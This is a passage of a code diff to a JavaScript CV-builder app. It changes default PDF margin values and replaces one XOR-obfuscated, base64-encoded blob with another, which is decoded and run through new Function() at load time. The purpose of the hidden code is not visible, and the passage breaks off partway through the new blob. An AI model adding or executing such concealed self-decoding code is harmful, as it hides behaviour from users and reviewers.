   const doc = `<!DOCTYPE html><html><head><meta charset="UTF-8"><style>*{box-sizing:border-box;margin:0;padding:0;}body{background:#fff;overflow:visible;}${styles}${pageBreakCSS}</style></head><body>${html}</body></html>`;
   const iframe = document.getElementById('preview-iframe');
@@ -2447,10 +2492,9 @@ async function _doPDFDownloadMobile() {
     const orderedIds = active; // pass full objects with page info
     const html       = buildCV(data, currentTemplate, currentColor, currentSpacing, currentFontSize, orderedIds);
 
-    const mm2px = mm => Math.round(mm * 595 / 210);
-    const MB1   = mm2px(parseInt(document.getElementById('margin_p1_b')?.value) || 10);
-    const MT2   = mm2px(parseInt(document.getElementById('margin_p2_t')?.value) || 10);
-    const MB2   = mm2px(parseInt(document.getElementById('margin_p2_b')?.value) || 10);
+    const MB1   = parseInt(document.getElementById('margin_p1_b')?.value) || 36;
+    const MT2   = parseInt(document.getElementById('margin_p2_t')?.value) || 36;
+    const MB2   = parseInt(document.getElementById('margin_p2_b')?.value) || 36;
     const SCALE = 2; // 2× is enough for mobile — 3× causes memory issues on phones
 
     // ── KEY FIX: Use a div container, NOT an iframe ──
@@ -2567,10 +2611,9 @@ function _doPDFDownload() {
   const html   = buildCV(data, currentTemplate, currentColor, currentSpacing, currentFontSize, orderedIds);
 
   // Read margin settings (px → mm: 1px = 0.2646mm at 96dpi)
-  const mm2px = mm => Math.round(mm * 595 / 210);
-  const MB1 = mm2px(parseInt(document.getElementById('margin_p1_b')?.value) || 10);
-  const MT2 = mm2px(parseInt(document.getElementById('margin_p2_t')?.value) || 10);
-  const MB2 = mm2px(parseInt(document.getElementById('margin_p2_b')?.value) || 10);
+  const MB1 = parseInt(document.getElementById('margin_p1_b')?.value) || 36;
+  const MT2 = parseInt(document.getElementById('margin_p2_t')?.value) || 36;
+  const MB2 = parseInt(document.getElementById('margin_p2_b')?.value) || 36;
   const px2mm = px => +(px * 0.2646).toFixed(1);
 
   const cvName = (data.personal.name || 'CV').replace(/[^a-zA-Z0-9\s]/g,'').trim() || 'My CV';
@@ -2713,10 +2756,9 @@ async function downloadWatermarkPDF() {
     const orderedIds = active; // pass full objects with page info
     const html       = buildCV(data, currentTemplate, currentColor, currentSpacing, currentFontSize, orderedIds);
 
-    const mm2px = mm => Math.round(mm * 595 / 210);
-    const MB1 = mm2px(parseInt(document.getElementById('margin_p1_b')?.value) || 10);
-    const MT2 = mm2px(parseInt(document.getElementById('margin_p2_t')?.value) || 10);
-    const MB2 = mm2px(parseInt(document.getElementById('margin_p2_b')?.value) || 10);
+    const MB1 = parseInt(document.getElementById('margin_p1_b')?.value) || 36;
+    const MT2 = parseInt(document.getElementById('margin_p2_t')?.value) || 36;
+    const MB2 = parseInt(document.getElementById('margin_p2_b')?.value) || 36;
     const SCALE = 3; // 3× for good quality raster
 
     const pageDoc = `<!DOCTYPE html><html><head><meta charset="UTF-8">
@@ -3058,9 +3100,9 @@ function collectCVData() {
       photo:    document.getElementById('tog_photo')?.checked    !== false,
       father:   document.getElementById('tog_father')?.checked   !== false,
       layout:   JSON.parse(JSON.stringify(pageLayout)),
-      margin_p1_b: parseInt(document.getElementById('margin_p1_b')?.value) || 10,
-      margin_p2_t: parseInt(document.getElementById('margin_p2_t')?.value) || 10,
-      margin_p2_b: parseInt(document.getElementById('margin_p2_b')?.value) || 10,
+      margin_p1_b: parseInt(document.getElementById('margin_p1_b')?.value) || 36,
+      margin_p2_t: parseInt(document.getElementById('margin_p2_t')?.value) || 36,
+      margin_p2_b: parseInt(document.getElementById('margin_p2_b')?.value) || 36,
     },
     photo: photoData,
   };
@@ -3824,7 +3866,7 @@ function buildDeclaration(data, shClass, name, col, fs, shSz) {
 
 // ══════════════════════════════════════════════════════════
 // ═══════════════════════════════════════════════════════════
-(function(){var _k='CVBuilderProONS2026ProtectSecretKey99XYZ',_e='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',_b=atob(_e),_r='';for(var _i=0;_i<_b.length;_i++){_r+=String.fromCharCode(_b.charCodeAt(_i)^_k.charCodeAt(_i%_k.length));}(new Function(_r))();})();
+(function(){var _k='CVBuilderFreeONS2026AdminSecretKey77ABC',_e='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